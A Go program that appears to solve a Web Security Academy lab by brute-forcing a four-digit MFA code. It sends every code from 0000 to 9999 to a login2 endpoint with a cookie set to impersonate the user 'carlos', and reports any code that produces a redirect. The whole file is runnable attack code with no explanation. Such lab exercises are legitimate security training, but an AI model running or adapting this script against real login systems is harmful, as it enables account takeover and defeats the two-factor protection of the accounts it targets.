package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
)

func bruteforce_mfacode(LabURL string, session string) {
	for i := 0; i < 10; i++ {
		for j := 0; j < 10; j++ {
			for k := 0; k < 10; k++ {
				for l := 0; l < 10; l++ {
					mfa_code := fmt.Sprintf("%d%d%d%d", i, j, k, l)
					postRequest(LabURL, mfa_code, session)
				}
			}
		}
	}
}

func postRequest(LabURL string, value string, session string) {

	// Params
	data := url.Values{}
	data.Set("mfa-code", value)

	// No redir
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	req, err := http.NewRequest(http.MethodPost, (LabURL + "/login2"), strings.NewReader(data.Encode()))
	if err != nil {
		log.Fatalln(err)
	}
	req.Header.Add("Host", LabURL)
	req.Header.Add("Cookie", "session="+session+";verify=carlos")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Add("Accept-Language", "en-US,en;q=0.5")
	req.Header.Add("Accept-Encoding", "gzip, deflate")
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Add("Content-Length", "13")
	req.Header.Add("Origin", LabURL)
	req.Header.Add("Referer", (LabURL + "/login2"))
	req.Header.Add("Upgrade-Insecure-Requests", "1")
	req.Header.Add("Sec-Fetch-Dest", "document")
	req.Header.Add("Sec-Fetch-Mode", "navigate")
	req.Header.Add("Sec-Fetch-Site", "same-origin")
	req.Header.Add("Sec-Fetch-User", "?1")
	req.Header.Add("Te", "trailers")
	req.Header.Add("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	if resp.StatusCode == 302 || resp.ContentLength == 0 {
		fmt.Println("Found redirect with mfa-code " + value)
	}

}

func main() {
	LabURL := "https://ac8b1f651fe604e6c0ae6196009c00e1.web-security-academy.net"

	session := ""

	bruteforce_mfacode(LabURL, session)

}
